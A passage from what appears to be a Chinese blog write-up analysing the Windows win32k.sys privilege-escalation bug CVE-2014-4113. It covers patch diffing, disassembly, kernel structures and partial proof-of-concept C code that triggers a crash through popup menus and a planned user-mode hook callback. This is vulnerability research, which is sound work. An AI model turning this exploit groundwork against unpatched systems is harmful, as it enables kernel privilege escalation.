+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=CVE-2014-4113 漏洞利用分析&url=https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=CVE-2014-4113 漏洞利用分析&url=https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html&via=b2ahex" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>作者：b2ahex</p>
+<h3 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1. 背景介绍"></a>1. 背景介绍</h3><blockquote>
+<p>win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  </p>
+</blockquote>
+<a id="more"></a>  
+<p>漏洞出现在 <em>win32k!xxxHandleMenuMessages</em> 流程中,当该函数调用 <em>win32k!xxxMNFindWindowFromPoint</em> 获取一个指向 <em>win32k!tagwnd</em> 的指针后，没有正确的判断返回值，导致将返回的错误代码(0xFFFFFFFB)当作指针，直接使用它作为参数调用 <em>win32k!xxxSendMessageTimeout</em> 对 <em>win32k!tagwnd</em> 对应的窗口发送消息，当 <em>win32k!tagwnd</em> 内容可控时，可以劫持RIP，实现特权提升等功能，以下分析及利用在windows 7 x64下进行。</p>
+<h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>对比更新了 <a href="https://technet.microsoft.com/en-us/library/security/ms14-058.aspx" target="_blank" rel="external">KB3000061</a> 补丁前后 win32k.sys 文件，在 <em>win32k!xxxHandleMenuMessages</em> 函数中发现新添加了一处校验函数 <em>IsMFMWFPWindow</em> 并怪变了后续代码流程。  </p>
+<p><img src="/blog/img/src/4113-1.jpg" alt="">   </p>
+<p>补丁前:  </p>
+<pre><code>.text:FFFFF97FFF162359 loc_FFFFF97FFF162359:   
+.text:FFFFF97FFF162359 lock add cs:glSendMessage, ebx  
+.text:FFFFF97FFF162360 mov r8d, [rsp+108h+arg_10] ; int  
+.text:FFFFF97FFF162368 mov dword ptr [rsp+108h+var_D0], ebx  
+.text:FFFFF97FFF16236C and [rsp+108h+var_D8], 0  
+.text:FFFFF97FFF162372 and [rsp+108h+var_E0], 0  
+.text:FFFFF97FFF162377 and dword ptr [rsp+108h+HighLimit], 0  
+.text:FFFFF97FFF16237C xor r9d, r9d; int  
+.text:FFFFF97FFF16237F mov edx, 1EDh   ; int  
+.text:FFFFF97FFF162384 mov rcx, r12; int  
+.text:FFFFF97FFF162387 call xxxSendMessageTimeout   
+</code></pre><p>补丁后:  </p>
+<pre><code>loc_FFFFF97FFF168FCF:
+.text:FFFFF97FFF168FCF mov rcx, r12  
+.text:FFFFF97FFF168FD2 call IsMFMWFPWindow     //新的校验函数
+.text:FFFFF97FFF168FD7 xor r14d, r14d  
+.text:FFFFF97FFF168FDA cmp eax, r14d    //如果 IsMFMWFPWindow 返回0，会跳过下面的xxxSendMessageTimeout 
+.text:FFFFF97FFF168FDD jz  short loc_FFFFF97FFF16902E  
+.text:FFFFF97FFF168FDF lock add cs:glSendMessage, ebx  
+.text:FFFFF97FFF168FE6 mov r8d, [rsp+108h+arg_10] ; int  
+.text:FFFFF97FFF168FEE mov dword ptr [rsp+108h+var_D0], ebx  
+.text:FFFFF97FFF168FF2 mov [rsp+108h+var_D8], r14  
+.text:FFFFF97FFF168FF7 xor r9d, r9d; int  
+.text:FFFFF97FFF168FFA mov edx, 1EDh   ; int  
+.text:FFFFF97FFF168FFF mov [rsp+108h+var_E0], r14d ; int  
+.text:FFFFF97FFF169004 mov dword ptr [rsp+108h+HighLimit], r14d ; HighLimit  
+.text:FFFFF97FFF169009 call xxxSendMessageTimeout  
+</code></pre><p><em>IsMFMWFPWindow</em> 这个函数主要功能是验证参数是否满足3个条件，只有都不满足的情况才会执行 <em>xxxSendMessageTimeout</em></p>
+<pre><code>.text:FFFFF97FFF1275A8 ; __int64 __fastcall IsMFMWFPWindow(__int64 ret)
+.text:FFFFF97FFF1275A8 test rcx, rcx
+.text:FFFFF97FFF1275AB jz  short loc_FFFFF97FFF1275C7   //是否等于0
+.text:FFFFF97FFF1275AD mov eax, 0FFFFFFFBh
+.text:FFFFF97FFF1275B2 cmp rcx, rax
+.text:FFFFF97FFF1275B5 jz  short loc_FFFFF97FFF1275C7   //是否等于0FFFFFFFBh
+.text:FFFFF97FFF1275B7 mov eax, 0FFFFFFFFh
+.text:FFFFF97FFF1275BC cmp rcx, rax
+.text:FFFFF97FFF1275BF jz  short loc_FFFFF97FFF1275C7   //是否等于0FFFFFFFFh
+.text:FFFFF97FFF1275C1 mov eax, 1
+.text:FFFFF97FFF1275C6 retn
+</code></pre><p>对比发现问题有可能是出现在 <em>win32k!xxxSendMessageTimeout</em> 函数对参数的使用中，分析未打补丁的 <em>win32k!xxxHandleMenuMessages</em> 上下文，查看参数的由来及到 <em>win32k!xxxSendMessageTimeout</em> 的执行流程:   </p>
+<p><strong>win32k!xxxHandleMenuMessages：</strong>  </p>
+<pre><code>.text:FFFFF97FFF1619BF cwde
+.text:FFFFF97FFF1619C0 mov [rdx+10h], eax
+.text:FFFFF97FFF1619C3 lea rdx, [rsp+108h+arg_10]
+.text:FFFFF97FFF1619CB call xxxMNFindWindowFromPoint
+      |——&gt;    ......
+            .text:FFFFF97FFF122A9F lea r8, [r11+8] ; int
+            .text:FFFFF97FFF122AA3 or  edx, eax
+            .text:FFFFF97FFF122AA5 movsxd  r9, edx ; int
+            .text:FFFFF97FFF122AA8 mov edx, 1EBh   ; int
+            .text:FFFFF97FFF122AAD call xxxSendMessageTimeout  //获取ptagwnd
+            .text:FFFFF97FFF122AB2 mov rbx, rax
+            .text:FFFFF97FFF122AB5 call ThreadUnlock1
+            .text:FFFFF97FFF122ABA test rbx, rbx  //判断返回值是否为空
+            .text:FFFFF97FFF122ABD jz  short loc_FFFFF97FFF122AE8
+            .text:FFFFF97FFF122ABF cmp rbx, rdi   //判断返回值是否等于0FFFFFFFBh
+            .text:FFFFF97FFF122AC2 jz  short loc_FFFFF97FFF122AD7
+            .text:FFFFF97FFF122AC4 cmp rbx, r12      //判断返回值是否等于0FFFFFFFFh
+            .text:FFFFF97FFF122AC7 jz  short loc_FFFFF97FFF122AD7
+            .text:FFFFF97FFF122AC9 mov dl, r14b
+            .text:FFFFF97FFF122ACC mov rcx, rbx
+            .text:FFFFF97FFF122ACF call HMValidateHandleNoSecure  
+                   |——&gt;    ......
+                    /*如果返回值(tagwnd指针)不为空，不等于0FFFFFFFBh，也不等于0FFFFFFFFh 
+                    就调用 HMValidateHandleNoSecure 检查窗口对象*/
+                        .text:FFFFF97FFF0CB056 mov rax, cs:gpsi
+                        .text:FFFFF97FFF0CB05D movzx   ecx, di
+                        .text:FFFFF97FFF0CB060 cmp rcx, [rax+8]   //对比 _THRDESKHEAD-&gt;h &amp; 0xffff 
+                        .text:FFFFF97FFF0CB064 jnb short loc_FFFFF97FFF0CB0D0
+                        .text:FFFFF97FFF0CB066 mov [rsp+28h+arg_0], rbx
+                        .text:FFFFF97FFF0CB06B mov ebx, cs:dword_FFFFF97FFF2DD310
+                        .text:FFFFF97FFF0CB071 shr rdi, 10h
+                        .text:FFFFF97FFF0CB075 imulebx, ecx
+                        .text:FFFFF97FFF0CB078 add rbx, cs:qword_FFFFF97FFF2DD308
+                        .text:FFFFF97FFF0CB07F cmp di, [rbx+12h]            //从 gSharedInfo-&gt;aheList 中查找比较tagwnd窗口
+                        .text:FFFFF97FFF0CB083 jz  short loc_FFFFF97FFF0CB0B1
+                        .text:FFFFF97FFF0CB085 mov ecx, 0FFFFh
+                        .text:FFFFF97FFF0CB08A cmp di, cx
+                        .text:FFFFF97FFF0CB08D jz  short loc_FFFFF97FFF0CB0B1
+                        .text:FFFFF97FFF0CB08F testdi, di
+                        .text:FFFFF97FFF0CB092 jnz short loc_FFFFF97FFF0CB09F
+                        .text:FFFFF97FFF0CB094 callcs:__imp_PsGetCurrentProcessWow64Process
+                        .text:FFFFF97FFF0CB09A testrax, rax
+                        .text:FFFFF97FFF0CB09D jnz short loc_FFFFF97FFF0CB0B1
+                        .text:FFFFF97FFF0CB09F xor eax, eax                //如果检查失败，将tagwnd指针清零
+                        .text:FFFFF97FFF0CB0A1 mov rbx, [rsp+28h+arg_0]
+                        .text:FFFFF97FFF0CB0A6 mov rsi, [rsp+28h+arg_8]
+                        .text:FFFFF97FFF0CB0AB add rsp, 20h
+                        .text:FFFFF97FFF0CB0AF pop rdi
+                        .text:FFFFF97FFF0CB0B0 retn
+            .text:FFFFF97FFF122AD4 mov rbx, rax   //覆盖返回值
+            ......
+.text:FFFFF97FFF1619D0 mov r14d, 0FFFFFFFBh
+.text:FFFFF97FFF1619D6 mov r13d, 0FFFFFFFFh
+.text:FFFFF97FFF1619DC mov r12, rax  //r12 == xxxSendMessageTimeout 返回值,就是补丁 IsMFMWFPWindow 校验的参数
+......  
+.text:FFFFF97FFF162305 loc_FFFFF97FFF162305:
+.text:FFFFF97FFF162305 mov esi, [rsp+108h+arg_10]
+.text:FFFFF97FFF16230C test r12, r12
+.text:FFFFF97FFF16230F jnz short loc_FFFFF97FFF16232B   判断 r12 是否等于0，假设不满足跳走  
+.text:FFFFF97FFF162311 test esi, esi
+.text:FFFFF97FFF162313 jnz short loc_FFFFF97FFF16232B
+.text:FFFFF97FFF162315 mov esi, [rsp+108h+var_B8]
+.text:FFFFF97FFF162319 xor r9d, r9d
+.text:FFFFF97FFF16231C xor r8d, r8d
+.text:FFFFF97FFF16231F xor edx, edx
+.text:FFFFF97FFF162321 mov rcx, rdi
+.text:FFFFF97FFF162324 call xxxMNCancel
+......
+.text:FFFFF97FFF16232B test byte ptr [rbp+0], 2
+.text:FFFFF97FFF16232F jz  short loc_FFFFF97FFF162341  //假如条件不满足，跳走
+.text:FFFFF97FFF162331 cmp r12, r14
+.text:FFFFF97FFF162334 jnz short loc_FFFFF97FFF162341  //假如返回值等于0FFFFFFFBh，跳走  
+.text:FFFFF97FFF162336 mov rcx, rbp
+.text:FFFFF97FFF162339 call xxxMNSwitchToAlternateMenu
+.text:FFFFF97FFF16233E mov r12, r13
+......
+.text:FFFFF97FFF162341 cmp r12, r13     //这里只比较了返回值(ptagwnd)和0FFFFFFFFh,没有比较0FFFFFFFBh
+.text:FFFFF97FFF162344 jnz short loc_FFFFF97FFF162359
+.text:FFFFF97FFF162346 mov r9d, ebx
+.text:FFFFF97FFF162349 mov r8d, esi
+.text:FFFFF97FFF16234C mov rdx, rdi
+.text:FFFFF97FFF16234F mov rcx, rbp
+.text:FFFFF97FFF162352 callxxxMNButtonDown
+.text:FFFFF97FFF162357 jmp short loc_FFFFF97FFF16238C
+.text:FFFFF97FFF162359 ; ---------------------------------------------------------------------------
+.text:FFFFF97FFF162359 lock add cs:glSendMessage, ebx
+.text:FFFFF97FFF162360 mov r8d, [rsp+108h+arg_10] ; int
+.text:FFFFF97FFF162368 mov dword ptr [rsp+108h+var_D0], ebx
+.text:FFFFF97FFF16236C and [rsp+108h+var_D8], 0
+.text:FFFFF97FFF162372 and [rsp+108h+var_E0], 0
+.text:FFFFF97FFF162377 and dword ptr [rsp+108h+HighLimit], 0
+.text:FFFFF97FFF16237C xor r9d, r9d; int
+.text:FFFFF97FFF16237F mov edx, 1EDh   ; int
+.text:FFFFF97FFF162384 mov rcx, r12; int
+.text:FFFFF97FFF162387 call xxxSendMessageTimeout  //所以如果参数等于 0xFFFFFFFB 就有可能成功执行 xxxSendMessageTimeout   
+</code></pre><p> 参数由来：调用 <em>win32k!xxxMNFindWindowFromPoint –&gt; win32k!xxxSendMessageTimeout</em> (0x1EB == MN_FINDMENUWINDOWFROMPOINT) 得到菜单窗口的指针，对应的内核结构体应该是 <em>win32k!tagwnd</em>  (每个窗口在内核中对应一个tagwnd对象)    </p>
+<p>通过对这个函数的分析发现，在使用 <em>win32k!xxxMNFindWindowFromPoint(0x1EB)</em> 获取窗口对象后， 如果 <em>xxxSendMessageTimeout</em> 返回的是0xFFFFFFFB，将有可能绕过所有的返回值验证，而 <em>win32k!xxxSendMessageTimeout</em> 会把它当作一个窗口对象的指针作为参数使用，最终访问异常的内存。</p>
+<h3 id="3-生成POC"><a href="#3-生成POC" class="headerlink" title="3. 生成POC"></a>3. 生成POC</h3><p>对比微软公告和漏洞补丁，发现问题应该出自于 <em>win32k!xxxHandleMenuMessages</em> ，IDA中xrefs几层后，发现问题可由内核中 <em>win32k!xxxTrackPopupMenuEx</em> 函数复现，一般根据经验它的用户层接口就是 <em>TrackPopupMenu</em> 可以去msdn中搜索详细信息，或者通过符号文件搜索相关信息，由于win32k提供的系统服务调用一般来自USER32模块和GDI32模块，windbg中通过x命令可以得到信息:   </p>
+<blockquote>
+<p>x user32! *TrackPopupMenu*<br>00000000`77a70c60 user32!TrackPopupMenu </p>
+</blockquote>
+<p><em>TrackPopupMenu</em> 调用,MSDN中描述如下：  </p>
+<blockquote>
+<p>TrackPopupMenu function<br>Displays a shortcut menu at the specified location and tracks the selection of items on the menu. The shortcut menu can appear anywhere on the screen.<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648002(v=vs.85" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ms648002(v=vs.85).aspx</a>.aspx)</p>
+</blockquote>
+<p>在指定的位置创建快捷菜单，并等待用户选择。   </p>
+<p>接着根据这个函数的参数构造代码，参数需要2个句柄，快捷菜单窗口创建完后要加入菜单项，否则会调用失败，如果调用成功，进程会堵塞住等待选择结果。</p>
+<pre><code>LRESULT CALLBACK WinSunProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+HINSTANCE hInstance = GetModuleHandle(NULL);
+WNDCLASS wndcls = { 0 };
+wndcls.hInstance = hInstance;
+wndcls.lpfnWndProc = WinSunProc;
+wndcls.lpszClassName = &quot;CVE-2014-4113&quot;;
+
+RegisterClassA(&amp;wndcls);
+HWND hwnd = CreateWindowA(
+wndcls.lpszClassName, &quot;CVE-2014-4113&quot;, WS_OVERLAPPEDWINDOW, 0, 0, 800, 800, NULL, NULL, wndcls.hInstance, NULL);
+
+HMENU demo = CreatePopupMenu();
+AppendMenu(demo, MF_STRING, 0, &quot;BSOD!&quot;); //菜单项不能为空，否则返回失败
+/*参数需要两个句柄，通过 CreateWindow 和 CreatePopupMenu 实现*/
+TrackPopupMenu(demo, 0, 0, 0, 0, hwnd, 0); 
+</code></pre><p>将编译好的程序放进双机调试的虚拟机中，windbg 给刚刚获取 ptagwnd 的地方（.text:FFFFF97FFF1619CB call xxxMNFindWindowFromPoint）下硬件断点： </p>
+<blockquote>
+<p>ba e1 win32k!xxxHandleMenuMessages+bb </p>
+</blockquote>
+<p>直接运行程序发现并没有断下来（一般来说肯定没那么顺利..），那再观察下 <em>win32k!xxxHandleMenuMessages</em> 看看是哪里条件不满足给跳走了，为了方便分析，首先要定位下这个函数里的重要结构体，通过分析win32k的符号文件，对比函数中结构体的偏移，发现 <em>win32k!xxxHandleMenuMessages</em> 的第一个参数应该是一个 _tagMSG 类型的指针，第三个参数应该是  _tagPOPUPMENU 类型的指针，从符号文件中找到结构体定义如下：</p>
+<p>_tagMSG：</p>
+<pre><code>          typedef struct _tagMSG            // 6 elements, 0x30 bytes (sizeof) 
+          {                                                                    
+/*0x000*/     struct _HWND__* hwnd;                                            
+/*0x008*/     UINT32       message;                                            
+/*0x00C*/     UINT8        _PADDING0_[0x4];                                    
+/*0x010*/     UINT64       wParam;                                             
+/*0x018*/     INT64        lParam;                                             
+/*0x020*/     ULONG32      time;                                               
+/*0x024*/     struct _tagPOINT pt;          // 2 elements, 0x8 bytes (sizeof)  
+/*0x02C*/     UINT8        _PADDING1_[0x4];                                    
+          }tagMSG, *PtagMSG;                                       
+</code></pre><p>_tagPOPUPMENU：</p>
+<pre><code>          typedef struct _tagPOPUPMENU                // 36 elements, 0x58 bytes (sizeof) 
+          {                                                                               
+              struct                                  // 25 elements, 0x4 bytes (sizeof)  
+              {                                                                           
+/*0x000*/         ULONG32      fIsMenuBar : 1;        // 0 BitPosition                    
+/*0x000*/         ULONG32      fHasMenuBar : 1;       // 1 BitPosition                    
+/*0x000*/         ULONG32      fIsSysMenu : 1;        // 2 BitPosition                    
+/*0x000*/         ULONG32      fIsTrackPopup : 1;     // 3 BitPosition                    
+/*0x000*/         ULONG32      fDroppedLeft : 1;      // 4 BitPosition                    
+/*0x000*/         ULONG32      fHierarchyDropped : 1; // 5 BitPosition                    
+/*0x000*/         ULONG32      fRightButton : 1;      // 6 BitPosition                    
+/*0x000*/         ULONG32      fToggle : 1;           // 7 BitPosition                    
+/*0x000*/         ULONG32      fSynchronous : 1;      // 8 BitPosition                    
+/*0x000*/         ULONG32      fFirstClick : 1;       // 9 BitPosition                    
+/*0x000*/         ULONG32      fDropNextPopup : 1;    // 10 BitPosition                   
+/*0x000*/         ULONG32      fNoNotify : 1;         // 11 BitPosition                   
+/*0x000*/         ULONG32      fAboutToHide : 1;      // 12 BitPosition                   
+/*0x000*/         ULONG32      fShowTimer : 1;        // 13 BitPosition                   
+/*0x000*/         ULONG32      fHideTimer : 1;        // 14 BitPosition                   
+/*0x000*/         ULONG32      fDestroyed : 1;        // 15 BitPosition                   
+/*0x000*/         ULONG32      fDelayedFree : 1;      // 16 BitPosition                   
+/*0x000*/         ULONG32      fFlushDelayedFree : 1; // 17 BitPosition                   
+/*0x000*/         ULONG32      fFreed : 1;            // 18 BitPosition                   
+/*0x000*/         ULONG32      fInCancel : 1;         // 19 BitPosition                   
+/*0x000*/         ULONG32      fTrackMouseEvent : 1;  // 20 BitPosition                   
+/*0x000*/         ULONG32      fSendUninit : 1;       // 21 BitPosition                   
+/*0x000*/         ULONG32      fRtoL : 1;             // 22 BitPosition                   
+/*0x000*/         ULONG32      iDropDir : 5;          // 23 BitPosition                   
+/*0x000*/         ULONG32      fUseMonitorRect : 1;   // 28 BitPosition                   
+              };                                                                          
+/*0x008*/     struct _tagWND* spwndNotify;                                                
+/*0x010*/     struct _tagWND* spwndPopupMenu;                                             
+/*0x018*/     struct _tagWND* spwndNextPopup;                                             
+/*0x020*/     struct _tagWND* spwndPrevPopup;                                             
+/*0x028*/     struct _tagMENU* spmenu;                                                    
+/*0x030*/     struct _tagMENU* spmenuAlternate;                                           
+/*0x038*/     struct _tagWND* spwndActivePopup;                                           
+/*0x040*/     struct _tagPOPUPMENU* ppopupmenuRoot;                                       
+/*0x048*/     struct _tagPOPUPMENU* ppmDelayedFree;                                       
+/*0x050*/     UINT32       posSelectedItem;                                               
+/*0x054*/     UINT32       posDropped;                                                    
+          }tagPOPUPMENU, *PtagPOPUPMENU;        
+</code></pre><p>函数流程中会比较 message ，对于不同的 message 做不同的处理，xrefs找一个能跳过去的地方：</p>
+<pre><code>.text:FFFFF97FFF161FBA loc_FFFFF97FFF161FBA:
+.text:FFFFF97FFF161FBA                 mov     ecx, eax
+.text:FFFFF97FFF161FBC                 sub     ecx, 203h
+.text:FFFFF97FFF161FC2                 jz      loc_FFFFF97FFF1623B2
+.text:FFFFF97FFF161FC8                 sub     ecx, ebx
+.text:FFFFF97FFF161FCA                 jz      loc_FFFFF97FFF16199D   //构造合适的消息走到这里，比如 0x204（516）
+
+.text:FFFFF97FFF16199D loc_FFFFF97FFF16199D:
+.text:FFFFF97FFF16199D                 test    byte ptr [r8], 40h  //这里要包含 0x40，一会看看这代表什么，只要这里不跳转就ok
+.text:FFFFF97FFF1619A1                 jz      loc_FFFFF97FFF161FDC
+.text:FFFFF97FFF1619A7 loc_FFFFF97FFF1619A7:                 
+.text:FFFFF97FFF1619A7                 or      dword ptr [rdx+14h], 0FFFFFFFFh
+.text:FFFFF97FFF1619AB                 movsx   eax, r9w
+.text:FFFFF97FFF1619AF                 mov     r8d, r9d
+.text:FFFFF97FFF1619B2                 mov     [rdx+0Ch], eax
+.text:FFFFF97FFF1619B5                 mov     rax, r9
+.text:FFFFF97FFF1619B8                 mov     rcx, rbp
+.text:FFFFF97FFF1619BB                 shr     rax, 10h
+.text:FFFFF97FFF1619BF                 cwde
+.text:FFFFF97FFF1619C0                 mov     [rdx+10h], eax
+.text:FFFFF97FFF1619C3                 lea     rdx, [rsp+108h+allocsize]
+.text:FFFFF97FFF1619CB                 call    xxxMNFindWindowFromPoint  //这里通过发送0x1eb消息，获取 tagwnd 的指针，  
+只要返回 0xfffffffb 就可以触发漏洞，下面对该返回值的访问会造成异常  
+</code></pre><p>函数大体执行流程如下: </p>
+<pre><code>    ......暂时不关心
+  if ( message &lt;= 0x104 ) 
+  {
+    ......暂时不关心
+  }
+  if ( message &gt; 0x202 )  
+  {
+     ......暂时不关心
+    if ( message == 0x204 )  //WM_RBUTTONDOWN
+    {
+LABEL_12:
+      if ( ptagPOPUPMENU-&gt;flag &amp; 0x40 )  //是否包含 fRightButton Flag
+        goto LABEL_13; 走到这里就行
+    }
+  }
+
+LABEL_13:  // 要让程序执行过来
+......
+  ptagWND = xxxMNFindWindowFromPoint(a3, &amp;v84, v8); 
+......
+</code></pre><p>r8等于 <em>tagPOPUPMENU</em> 指针，40h 的2进制表示为 ‭01000000‬ ，这里判断第一个字节是否含有 <em>fRightButton</em> 标志位,在msdn中查阅 <em>POPUPMENU</em> 资料，看名字估计就是 <em>TPM_RIGHTBUTTON</em> flag，所以在代码中指定下这个flag：</p>
+<pre><code>TrackPopupMenu(demo, TPM_RIGHTBUTTON, 0, 0, 0, hwnd, 0);
+</code></pre><p>根据上面的分析 message == 0x204 时，代码可以走到这里，所以在出现窗口后，右键点击菜单窗口<br>，成功断在 <em>win32k!xxxMNFindWindowFromPoint</em> , 继续给函数内的 <em>call xxxSendMessageTimeout</em> 下断，但是没有断下来 , 继续跟进这个函数分析原因：</p>
+<pre><code>.text:FFFFF97FFF122A10 ; signed __int64 __fastcall xxxMNFindWindowFromPoint
+.text:FFFFF97FFF122A10
+.text:FFFFF97FFF122A10 var_78          = qword ptr -78h
+.text:FFFFF97FFF122A10 var_70          = dword ptr -70h
+.text:FFFFF97FFF122A10 arg_0           = dword ptr  8
+.text:FFFFF97FFF122A10 arg_8           = qword ptr  10h
+.text:FFFFF97FFF122A10 arg_10          = dword ptr  18h
+.text:FFFFF97FFF122A10
+.text:FFFFF97FFF122A10                 mov     r11, rsp
+.text:FFFFF97FFF122A13                 mov     [r11+18h], r8d
+.text:FFFFF97FFF122A17                 push    rbx
+.text:FFFFF97FFF122A18                 push    rbp
+.text:FFFFF97FFF122A19                 push    rsi
+.text:FFFFF97FFF122A1A                 push    rdi
+.text:FFFFF97FFF122A1B                 push    r12
+.text:FFFFF97FFF122A1D                 push    r13
+.text:FFFFF97FFF122A1F                 push    r14
+.text:FFFFF97FFF122A21                 sub     rsp, 60h
+.text:FFFFF97FFF122A25                 and     dword ptr [rdx], 0
+.text:FFFFF97FFF122A28                 mov     rbp, rcx
+.text:FFFFF97FFF122A2B                 mov     rcx, [rcx+18h] // _tagPOPUPMENU + 0x18 的位置 == _tagWND* spwndNextPopup; 
+.text:FFFFF97FFF122A2F                 mov     r13, rdx
+.text:FFFFF97FFF122A32                 mov     edi, 0FFFFFFFBh
+.text:FFFFF97FFF122A37                 mov     r14d, 1
+.text:FFFFF97FFF122A3D                 mov     r12d, 0FFFFFFFFh
+.text:FFFFF97FFF122A43                 test    rcx, rcx
+.text:FFFFF97FFF122A46                 jz      loc_FFFFF97FFF122AF0 如果 spwndNextPopup 为空就跳走，不会发送消息
+</code></pre><p>  由于 <em>win32k!xxxMNFindWindowFromPoint</em> 验证当前_tagPOPUPMENU对象的 spwndNextPopup指针（其实就是检查它下一个PopupMenu窗口的指针），如果指针为0，就跳走不发送消息，所以需要再创建一个PopupMenu的菜单项。</p>
+<pre><code>HMENU popup_menu1 = CreatePopupMenu();  
+HMENU popup_menu2 = CreatePopupMenu();        //这里还需要一个 PopupMenu
+AppendMenu(popup_menu2, MF_STRING, 0, 0);    //给 新PopupMenu随便添加个菜单项 （不能没有菜单项）
+
+AppendMenu(popup_menu1, MF_STRING | MF_POPUP, (UINT_PTR)popup_menu2,&quot;BSOD&quot;);  //将 popup_menu2 设置为 popup_menu1 的菜单项
+
+BOOL ret = TrackPopupMenu(popup_menu1, TPM_RIGHTBUTTON, 0, 0, 0, hwnd, 0);
+</code></pre><p>编译好代码运行到这里后你会发现，这个指针依然为0，因为 popup_menu2 的窗口没有创建，所以 它的 _tagWND 指针肯定为空，tagwnd窗口对象在CreateWindow中创建.   </p>
+<p>这时候点一下 第一个 PopupMenu(BSOD)窗口，就会弹出 popup_menu2 的窗口，<em>spwndNextPopup</em>就有内容了，同时 <em>xxxSendMessageTimeout</em> 顺利执行，就像之前分析的，假如这时它返回 0XFFFFFFFB ,就会引发BSOD.</p>
+<p>简单分析下 <em>win32k!xxxSendMessageTimeout</em> 流程 :  </p>
+<pre><code>int __fastcall xxxSendMessageTimeout(...)
+{  
+  if ( ptagWND != -1 )
+  {
+    // 跳过 DDE 消息                                   
+    // #define WM_INTERNAL_DDE__reserved_3e1 0x3e1
+    // #define WM_INTERNAL_DDE__reserved_3e8 0x3e8
+
+    if ( gptiCurrent != ptagWND-&gt;head-&gt;pti )     //判断发送的窗口是否属于当前线程 
+    {
+      if ( ptagWND-&gt;head-&gt;pti-&gt;xxxx-&gt;Header-&gt;Type &amp; 1 ) 
+      {  
+        LODWORD(v13) = xxxDefWindowProc(ptagWND, uMsg, v10, v9); 
+        return v13;
+      }
+      ......
+      LODWORD(v13) = xxxInterSendMsgEx(ptagWND, uMsg, v10, v9);  
+      return v13;
+    }
+    if ( (gptiCurren-&gt;fsHooks | gptiCurrent -&gt;pDeskInfo-&gt;fsHooks) &amp; 0x20 ) //检测是否安装了hook
+    {                                          
+      .....
+      xxxCallHook(0i64, 0i64, (__int64)&amp;v26, 4u);  // 如果存在hook标识，就去调用用户层注册的 hook 函数
+    }
+    if (ptagWND-&gt;bServerSideWindowProc)       //检查当前窗口对象 bServerSideWindowProc 是否有该标志位，  
+    是否允许内核执行窗口过程，只有使用windows默认的回调的窗口才含有这个标志 
+    {
+      ......
+      LODWORD(v13) = ptagwnd-&gt;lpfnWndProc(ptagwnd, uMsg, v10, v9); //内核模式下执行 lpfnWndProc 窗口过程
+    }
+    else
+    {
+      xxxSendMessageToClient(ptagwnd, uMsg, v10, v9);  //对目标窗口发送消息
+        if ( uMsg - 0x240 &gt; 0xF )
+        {
+          if ( uMsg == 0x119 )
+            FreeGestureInfo(v10, 1i64);
+        }
+        else
+        {
+          FreeTouchInputInfo(v10, 1i64);
+        }
+        if ( !hi32 )
+        {
+          LODWORD(v14) = v22;
+          return v14;
+        }
+        *(_QWORD *)hi32 = v22;
+      }
+      LODWORD(v14) = 1;
+      return v14;
+    }
+    LODWORD(v13) = 1;
+    return v13;
+  }
+  if ( hi32 )
+  {
+    v27 = hi32;
+    v26 = __PAIR__(a6, (unsigned int)HighLimit);
+  }
+  LODWORD(v13) = xxxBroadcastMessage(0i64, message, a3, a4);
+  return v13;
+}
+</code></pre><p>注意看前后顺序，上面的代码中首先检测pti是否相同，接着如果检测到对方线程有设置 fshook 将会优先调用在用户层注册的 hook 函数，这给了我们一个中途回用户层的机会，当执行完hook函数再次返回到内核时，会马上执行 xxxSendMessageToClient 对目标窗口发送消息，接下来将通过 <a href="https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_Slides.pdf" target="_blank" rel="external"><em>User Mode Callbacks</em></a> 机制攻击 <em>win32k!xxxSendMessageTimeout</em> 目标快捷菜单窗口 ,    思路如下:</p>
+<p>首先在r3层设置全局hook通过fsHooks检查，在hook函数中判断是否是0x1EB的消息，如果是该消息就修改目标窗口的过程函数，让这个新的窗口函数返回0`FFFFFFFB，因为hook函数执行完后回到内核马上就会往这个窗口发消息，由于后面的代码没有对这个返回值进行处理，所以最终 xxxSendMessageTimeout 会将它作为一个tagwnd对象的指针，当对其访问时就会引发异常。</p>
+<p>现在总结下需要在代码中更新的部分:<br><strong>1.确保由窗口过程执行执行消息发送 (gptiCurrent == ptagWND-&gt;head-&gt;pti)</strong><br>条件已满足  </p>
